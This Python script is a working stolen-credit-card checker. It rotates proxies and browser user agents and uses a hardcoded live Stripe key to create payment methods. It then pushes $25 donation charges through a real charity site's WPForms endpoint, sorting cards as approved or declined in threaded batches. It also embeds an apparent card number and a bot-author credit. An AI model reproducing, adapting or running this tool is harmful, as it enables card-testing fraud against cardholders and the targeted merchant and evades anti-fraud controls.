import requests
import os
import re
import random
import string
import time
import json
import uuid
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
import threading

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
STRIPE_KEY = "pk_live_51NdxjPD4CaMGpg6VjNWdfgA0dLCD7u0okjERkjbA2OlqNeDceQzHScZhNSCyDWxyg3OjS3ZhdCT8z42eEYgrmw4z00OvQCdAKO"
BASE_URL = "https://heybenji.org"
EMAIL = "hellomohitv2@tiffincrane.com"

def get_rotating_user_agent():
    desktop_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0'
    ]
    return random.choice(desktop_agents)

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def setup_session(proxy_str=None):
    r = requests.Session()
    
    # Setup retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504, 429],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    r.mount("https://", adapter)
    r.mount("http://", adapter)
    
    # Set proxies if provided
    if proxy_str:
        proxies = parse_proxy(proxy_str)
        if proxies:
            r.proxies.update(proxies)
    
    return r

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def generate_stripe_metadata():
    """Generate Stripe metadata like guid, muid, sid"""
    return {
        'guid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16],
        'muid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16],
        'sid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16]
    }

def extract_error_from_text(text):
    """Extract error message from raw text/HTML response"""
    if not text:
        return None
    
    # Common error patterns to look for
    error_patterns = [
        r'(?:card|payment|transaction).*?declined[^.]*',
        r'(?:card|payment|transaction).*?failed[^.]*',
        r'(?:card|payment|transaction).*?error[^.]*',
        r'your card was declined[^.]*',
        r'card declined[^.]*',
        r'payment failed[^.]*',
        r'declined[^.]*',
        r'error[^.]*',
        r'<div[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)</div>',
        r'<span[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)</span>',
        r'<p[^>]*class="[^"]*error[^"]*"[^>]*>([^<]+)</p>',
    ]
    
    text_lower = text.lower()
    
    # Try to find error messages
    for pattern in error_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE | re.DOTALL)
        if matches:
            error_msg = matches[0].strip()
            if error_msg and len(error_msg) > 5:  # Make sure it's meaningful
                # Clean HTML entities
                error_msg = error_msg.replace('&nbsp;', ' ').replace('&amp;', '&')
                error_msg = re.sub(r'\s+', ' ', error_msg)  # Normalize whitespace
                return error_msg[:200]  # Limit length
    
    # If no pattern matches, try to find any meaningful error-like text
    # Look for sentences containing decline, error, fail, etc.
    sentences = re.split(r'[.!?]\s+', text)
    for sentence in sentences:
        sentence_lower = sentence.lower()
        if any(word in sentence_lower for word in ['declined', 'error', 'failed', 'invalid', 'rejected', 'denied']):
            cleaned = re.sub(r'<[^>]+>', '', sentence).strip()
            if cleaned and len(cleaned) > 10:
                return cleaned[:200]
    
    return None

def extract_error_message(response_json, response_text):
    """Extract actual error message from site response"""
    error_message = None
    
    # Handle simple response types (numbers, booleans, strings)
    if isinstance(response_json, (int, float)):
        # If response is a number, check if it's an error code
        if response_json == 0:
            # 0 might mean failure, try to get message from text
            error_message = extract_error_from_text(response_text)
        else:
            error_message = f"Response code: {response_json}"
    elif isinstance(response_json, bool):
        if not response_json:
            error_message = extract_error_from_text(response_text) or "Request failed"
        else:
            error_message = "Success"
    elif isinstance(response_json, str):
        # If response is a string, extract error from it
        error_message = extract_error_from_text(response_json) or response_json[:200]
    
    # Try to extract from JSON response (dict)
    if not error_message and isinstance(response_json, dict):
        # Check for nested structure: data.errors.general.footer (WPForms structure)
        if 'data' in response_json:
            data = response_json['data']
            if isinstance(data, dict):
                # Check for WPForms error structure: data.errors.general.footer
                if 'errors' in data:
                    errors = data['errors']
                    if isinstance(errors, dict):
                        # Check for 'general' key
                        if 'general' in errors:
                            general = errors['general']
                            if isinstance(general, dict):
                                # Check for 'footer' which contains HTML
                                if 'footer' in general:
                                    footer_html = str(general['footer'])
                                    # Extract text from <p> tag
                                    p_match = re.search(r'<p[^>]*>(.*?)</p>', footer_html, re.IGNORECASE | re.DOTALL)
                                    if p_match:
                                        error_message = p_match.group(1).strip()
                                    else:
                                        # If no <p> tag, extract all text from HTML
                                        error_message = re.sub(r'<[^>]+>', '', footer_html).strip()
                                # Check for other keys in general
                                for key, value in general.items():
                                    if key != 'footer' and isinstance(value, str) and value.strip():
                                        error_message = value.strip()
                                        break
                        # If no 'general', check other error keys
                        if not error_message:
                            for key, value in errors.items():
                                if isinstance(value, dict):
                                    # Check nested dicts
                                    if 'footer' in value:
                                        footer_html = str(value['footer'])
                                        p_match = re.search(r'<p[^>]*>(.*?)</p>', footer_html, re.IGNORECASE | re.DOTALL)
                                        if p_match:
                                            error_message = p_match.group(1).strip()
                                            break
                                    # Check for message or other text fields
                                    for sub_key, sub_value in value.items():
                                        if sub_key != 'footer' and isinstance(sub_value, str) and sub_value.strip():
                                            error_message = sub_value.strip()
                                            break
                                    if error_message:
                                        break
                                elif isinstance(value, str) and value.strip():
                                    error_message = value.strip()
                                    break
                                elif isinstance(value, list) and len(value) > 0:
                                    error_message = str(value[0]).strip()
                                    break
                
                # Check for message in data
                if not error_message and 'message' in data:
                    error_message = str(data['message']).strip()
                elif not error_message and 'error' in data:
                    error_message = str(data['error']).strip()
        
        # Check top-level message
        if not error_message and 'message' in response_json:
            error_message = str(response_json['message']).strip()
        elif not error_message and 'error' in response_json:
            if isinstance(response_json['error'], dict):
                if 'message' in response_json['error']:
                    error_message = str(response_json['error']['message']).strip()
                else:
                    error_message = str(response_json['error']).strip()
            else:
                error_message = str(response_json['error']).strip()
        elif not error_message and 'errors' in response_json:
            if isinstance(response_json['errors'], dict):
                for key, value in response_json['errors'].items():
                    if isinstance(value, list) and len(value) > 0:
                        error_message = str(value[0]).strip()
                        break
                    elif isinstance(value, str) and value.strip():
                        error_message = value.strip()
                        break
    
    # If still no message, try to extract from raw text
    if not error_message:
        if isinstance(response_json, str):
            error_message = extract_error_from_text(response_json)
        else:
            error_message = extract_error_from_text(response_text)
    
    # If still no message, try to get something from the response
    if not error_message:
        # Try to get a meaningful snippet from the response
        if isinstance(response_json, dict):
            # Convert dict to string and get first meaningful part
            response_str = str(response_json)
            # Look for any text that might be an error message
            if 'declined' in response_str.lower() or 'error' in response_str.lower() or 'fail' in response_str.lower():
                # Extract a relevant portion
                error_message = response_str[:200]
        elif isinstance(response_json, str):
            error_message = response_json[:200]
        else:
            # Last resort: show part of raw response text
            error_message = response_text[:200] if response_text else "No response received"
    
    # Clean up the message
    if error_message:
        error_message = error_message.strip()
        # Remove HTML tags if any
        error_message = re.sub(r'<[^>]+>', '', error_message)
        # Clean HTML entities
        error_message = error_message.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"')
        # Normalize whitespace
        error_message = re.sub(r'\s+', ' ', error_message)
        # Limit length
        if len(error_message) > 200:
            error_message = error_message[:200] + "..."
    
    # ALWAYS return the actual message from response, never "Payment failed"
    return error_message if error_message and len(error_message) > 3 else (response_text[:150] if response_text else "No response data")

def check_card_st25(cc_line):
    start_time = time.time()
    max_retries = 2
    
    for attempt in range(max_retries):
        try:
            # Parse card details
            if '|' in cc_line:
                parts = cc_line.strip().split('|')
                if len(parts) >= 4:
                    n = parts[0].strip().replace(' ', '').replace('+', '')
                    mm = parts[1].strip()
                    yy = parts[2].strip()
                    cvc = parts[3].strip()
                else:
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if len(yy) == 4:
                yy = yy[2:]
            
            # Get BIN info
            bin_info = get_bin_info(n[:6])
            
            # Setup session with random proxy from proxy.txt (separate session for each card)
            proxies_list = load_proxies()
            if not proxies_list:
                proxy_str = None
            else:
                proxy_str = random.choice(proxies_list)
            r = setup_session(proxy_str)
            user_agent = get_rotating_user_agent()
            
            # Generate Stripe metadata for this session
            stripe_meta = generate_stripe_metadata()
            
            # Step 1: Create payment method using Stripe API
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': user_agent,
            }
            
            # Prepare form data for payment method creation
            from urllib.parse import urlencode, quote_plus
            
            # Format card number with + instead of spaces (as in original request)
            card_number_formatted = n.replace(' ', '+')
            
            # Build form data dictionary
            data = {
                'type': 'card',
                'card[number]': card_number_formatted,
                'card[cvc]': cvc,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'ZW',
                'billing_details[email]': EMAIL,
                'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent; autopm',
                'referrer': BASE_URL,
                'time_on_page': str(random.randint(20000, 30000)),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'client_attribution_metadata[merchant_integration_additional_elements][1]': 'linkAuthentication',
                'guid': stripe_meta['guid'],
                'muid': stripe_meta['muid'],
                'sid': stripe_meta['sid'],
                'key': STRIPE_KEY,
            }
            
            # Use requests' built-in form encoding
            response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)
            
            if response.status_code != 200:
                elapsed_time = time.time() - start_time
                error_msg = "Payment method creation failed"
                try:
                    error_data = response.json()
                    if 'error' in error_data:
                        error_msg = error_data['error'].get('message', error_msg)
                except:
                    pass
                
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Extract payment method ID
            try:
                payment_method_data = response.json()
                if 'id' not in payment_method_data:
                    elapsed_time = time.time() - start_time
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment method ID not found ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                payment_method_id = payment_method_data['id']
            except Exception as e:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Error parsing payment method response ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Step 2: Submit payment form
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAIuheMfs6Pojbuyh',
                'origin': BASE_URL,
                'priority': 'u=1, i',
                'referer': f'{BASE_URL}/stripe-payment/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            # Generate random name
            first_name = random.choice(['Sam', 'John', 'Mike', 'David', 'Chris', 'Alex', 'James', 'Tom'])
            last_name = random.choice(['Jones', 'Smith', 'Brown', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson'])
            
            # Prepare multipart form data (using exact values from original request)
            files = {
                'wpforms[fields][0][first]': (None, first_name),
                'wpforms[fields][0][last]': (None, last_name),
                'wpforms[fields][1]': (None, EMAIL),
                'wpforms[fields][3]': (None, '5'),
                'wpforms[fields][4]': (None, '$25.00'),
                'wpforms[id]': (None, '1236'),
                'page_title': (None, 'stripe payment'),
                'page_url': (None, f'{BASE_URL}/stripe-payment/'),
                'url_referer': (None, ''),
                'page_id': (None, '1238'),
                'wpforms[post_id]': (None, '1238'),
                'wpforms[payment_method_id]': (None, payment_method_id),
                'wpforms[token]': (None, 'acf8ebece6eddc72b625d36ac5d6c065'),
                'action': (None, 'wpforms_submit'),
                'start_timestamp': (None, '1766931108'),
                'end_timestamp': (None, '1766931135'),
            }
            
            response = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, files=files, timeout=30, verify=False)
            
            elapsed_time = time.time() - start_time
            
            # Check response for success
            try:
                response_json = response.json()
                success = False
                response_message = None
                
                # Debug: Print actual response for troubleshooting
                print(f"DEBUG - Response JSON: {response_json}")
                print(f"DEBUG - Response Text: {response.text[:500]}")
                
                # Check various success indicators
                if response.status_code == 200:
                    # Check for success in response
                    if isinstance(response_json, dict):
                        if response_json.get('success') == True:
                            success = True
                            response_message = "Charged $25.00 ✅"
                        elif 'data' in response_json:
                            if isinstance(response_json['data'], dict):
                                if response_json['data'].get('success') == True:
                                    success = True
                                    response_message = "Charged $25.00 ✅"
                    elif isinstance(response_json, (str, int, float, bool)):
                        # Handle simple response types
                        if response_json == True or response_json == 1 or (isinstance(response_json, str) and ('success' in response_json.lower() or 'approved' in response_json.lower())):
                            success = True
                            response_message = "Charged $25.00 ✅"
                
                # Also check response text for success indicators
                if not success:
                    response_text_lower = response.text.lower()
                    if 'success' in response_text_lower or 'approved' in response_text_lower:
                        if 'error' not in response_text_lower and 'decline' not in response_text_lower and 'fail' not in response_text_lower:
                            success = True
                            response_message = "Charged $25.00 ✅"
                
                if success:
                    status = "APPROVED CC ✅"
                    response_emoji = "✅"
                else:
                    status = "DECLINED CC ❌"
                    response_emoji = "❌"
                    # ALWAYS extract actual error message from site response
                    response_message = extract_error_message(response_json, response.text)
                    
                    # If we got a minimal response like "0", show the full response structure
                    if not response_message or response_message in ["0", "Payment failed", ""] or len(response_message) < 5:
                        # Show the actual response structure
                        if isinstance(response_json, dict):
                            # Try to get a better representation
                            import json
                            response_str = json.dumps(response_json, indent=2)[:300]
                            response_message = f"Site Response: {response_str}"
                        elif isinstance(response_json, (str, int, float, bool)):
                            response_message = f"Site Response: {str(response_json)}"
                        else:
                            response_message = f"Site Response: {str(response.text)[:200]}"
                
            except Exception as e:
                # If JSON parsing fails, try to extract from raw text
                if response.status_code == 200:
                    # Try to parse as text/html to find error messages
                    error_msg = extract_error_from_text(response.text)
                    if error_msg and ('declined' in error_msg.lower() or 'error' in error_msg.lower() or 'fail' in error_msg.lower()):
                        status = "DECLINED CC ❌"
                        response_emoji = "❌"
                        response_message = error_msg
                    else:
                        # Check if response text suggests success
                        if 'success' in response.text.lower() and 'error' not in response.text.lower():
                            status = "APPROVED CC ✅"
                            response_emoji = "✅"
                            response_message = "Charged $25.00 ✅"
                        else:
                            status = "DECLINED CC ❌"
                            response_emoji = "❌"
                            response_message = extract_error_from_text(response.text) or response.text[:150]
                else:
                    status = "DECLINED CC ❌"
                    response_emoji = "❌"
                    error_msg = extract_error_from_text(response.text)
                    response_message = error_msg if error_msg else response.text[:150] or f"Status: {response.status_code}"
            
            return f"""
{status}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message} {response_emoji}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    # This return statement is outside the for loop
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Max retries exceeded
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_st25(cc_lines):
    """Mass check function for multiple cards with threading"""
    results = []
    lock = threading.Lock()
    
    def process_card(cc_line):
        result = check_card_st25(cc_line)
        with lock:
            results.append(result)
        time.sleep(0.5)  # Small delay between checks
    
    threads = []
    for cc_line in cc_lines:
        thread = threading.Thread(target=process_card, args=(cc_line,))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    return results

if __name__ == "__main__":
    # Test single card
    test_card = "4447962663646762|08|29|616"
    result = check_card_st25(test_card)
    print(result)

